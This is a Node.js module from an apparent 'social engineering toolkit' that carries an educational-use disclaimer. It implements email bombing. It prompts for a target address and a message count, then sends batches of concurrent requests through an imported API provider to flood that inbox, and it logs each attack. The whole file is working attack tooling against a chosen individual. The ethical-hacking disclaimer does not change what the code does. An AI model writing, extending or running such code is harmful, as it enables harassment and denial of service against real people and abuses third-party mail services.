#!/usr/bin/env node

/*
SocialEngineer - Social Engineering Toolkit
-------------------------------------------

Author      : Karthikeyan (https://karthithehacker.com)
GitHub      : https://github.com/karthi-the-hacker
Project     : SocialEngineering - An all-in-one CLI framework for social engineering

License     : Open-source — strictly for educational and ethical hacking purposes ONLY.

Note to Users:
--------------
🔐 This tool is intended solely for educational use, research, and authorized security testing.
🚫 Unauthorized use of this tool on networks you do not own or lack permission to test is illegal.
❗ If you use or modify this code, PLEASE GIVE PROPER CREDIT to the original author.

Warning to Code Thieves:
------------------------
❌ Removing this header or claiming this project as your own without credit is unethical and violates open-source principles.
🧠 Writing your own code earns respect. Copy-pasting without attribution does not.
✅ Be an ethical hacker. Respect developers' efforts and give credit where it’s due.
*/


const readline = require('readline');
const chalk = require('chalk');
const ora = require('ora');
const ui = require('../includes/banner');
const APIProvider = require('./provider');
const os = require('os');
const db = require('../includes/dbgateway');

// reuse autotest queue logic from otpBombing
let _testQueue = [];
if (process.argv[2] === '--autotest') {
    _testQueue = process.argv.slice(3);
}

function askQuestion(prompt) {
    if (_testQueue.length) {
        const answer = _testQueue.shift();
        process.stdout.write(prompt + answer + os.EOL);
        return Promise.resolve(answer.trim());
    }
    return new Promise(resolve => {
        const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
        rl.question(prompt, ans => {
            rl.close();
            resolve(ans.trim());
        });
    });
}

function emailBanner() {
    ui.clearScreen();
    ui.printBanner();
    console.log(chalk.red('📲 Email Bombing'));
}

function inputInstructions() {

    console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ ${chalk.red('Instructions')}                                                 ┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ ${chalk.white('👉 Enter Email Id (e.g. test@email.com)')}                      ┃
┃ ${chalk.white('👉 Enter number of Email to send max ')}${chalk.red('100')}                     ┃
┃ ${chalk.white('❌ Enter ')}${chalk.red("'x'")}${chalk.white(' to exit anytime')}                                 ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
`);
}

async function getEmailId() {
    while (true) {
        const email = await askQuestion('📧 Enter Email Address (type \'x\' to exit): ');
        if (email.toLowerCase() === 'x') { ui.clearScreen(); ui.printBanner(); return 'exit'; }
        // simple regex same as python
        if (/^[^@ \t\r\n]+@[^@ \t\r\n]+\.[^@ \t\r\n]+$/.test(email)) {
            return email;
        }
        console.log(chalk.red('❌ Invalid email format. Please enter a valid email address.'));
    }
}

async function getEmailCount() {
    while (true) {
        const input = await askQuestion('📲 Enter number of email to send (10–100): ');
        if (input.toLowerCase() === 'x') { ui.clearScreen(); ui.printBanner(); return 'exit'; }
        if (!/^[0-9]+$/.test(input)) {
            console.log(chalk.red('❌ Invalid input. Please enter a number.'));
            continue;
        }
        const count = parseInt(input, 10);
        if (count < 10 || count > 100) {
            console.log(chalk.red('❌ Please enter a number between 10 and 100.'));
            continue;
        }
        return count;
    }
}

async function run() {
    emailBanner();
    inputInstructions();

    const emailid = await getEmailId();
    if (emailid === 'exit') return;
    const count = await getEmailCount();
    if (count === 'exit') return;
    ui.clearScreen();
    ui.printBanner();
   const displayEmail =
    emailid.length > 25 ? emailid.slice(0, 22) + "..." : emailid;

console.log(`
${chalk.red("🚀 Attack Started")}

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ ${chalk.white("Email Id:")} ${chalk.red(displayEmail)}${" ".repeat(25 - displayEmail.length)}      ┃
┃ ${chalk.white("Email count:")} ${chalk.red(count)}${" ".repeat(27 - String(count).length)} ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
`);
    const provider = new APIProvider('in', emailid, 'mail', 1);
    let success = 0;
    let failed = 0;

    const spinner = ora('Sending Emails...').start();
    const concurrency = 10;
    for (let sent = 0; sent < count && APIProvider.status; sent += concurrency) {
        const batchSize = Math.min(concurrency, count - sent);
        const batch = [];
        for (let i = 0; i < batchSize; i++) {
            batch.push(provider.hit());
        }
        const results = await Promise.all(batch);
        results.forEach(res => {
            if (res === true) success++;
            else failed++;
        });
        spinner.text = `Sending Emails... (${success + failed}/${count})`;
    }

    spinner.succeed('✅ Email Bombing Completed!');
    try {
        db.logEmailBomb({
            datetime: new Date().toISOString(),
            email: emailid,
            total: count,
            sent: success
        });
    } catch (_e) {}

    await askQuestion('\n🔙 Enter 0 to return to the main menu: ');
    ui.clearScreen();
    ui.printBanner();
}

module.exports = { run };

if (require.main === module) {
    (async () => {
        await run();
    })();
}
